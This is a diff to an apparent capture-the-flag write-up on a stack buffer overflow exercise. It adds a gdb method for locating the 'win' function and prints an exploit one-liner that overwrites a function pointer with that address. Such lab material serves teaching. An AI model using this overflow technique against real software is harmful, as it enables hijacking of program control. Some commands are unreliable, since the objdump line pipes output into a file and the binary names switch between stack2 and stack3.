@@ -200,7 +200,8 @@ int main(int argc, char **argv)
 | eip | ebp | fp(0) |   buffer  |
 
 ###Plan:
-Another overflow. This time we need to use objdump/gdb to find the memory location of the win function. 
+Another overflow. This time we need to use objdump/gdb to find the memory location of the win function. There are a few ways to accomplish this, so I will cover two.
+####Objdump
 run the following to generate your assembly:
 ```bash
 objdump -d ./stack2 | ./stack2.s
@@ -216,7 +217,10 @@ after reviewing your assembly, you can see the following
  8048436:	c9                   	leave  
  8048437:	c3                   	ret   
 ```
-this indicates win is at 0x08048424 in memory, so we craft an input that overflows into fp with this location (adjusted for endianess) 
+####gdb
+simply use x win in gdb to print the memory location of win
+
+we now know win is at 0x08048424 in memory, so we craft an input that overflows into fp with this location (adjusted for endianess) 
 ###winning command:
 ```bash
 python -c "print 'a'*64+'\x24\x84\x04\x08'" | ./stack3 
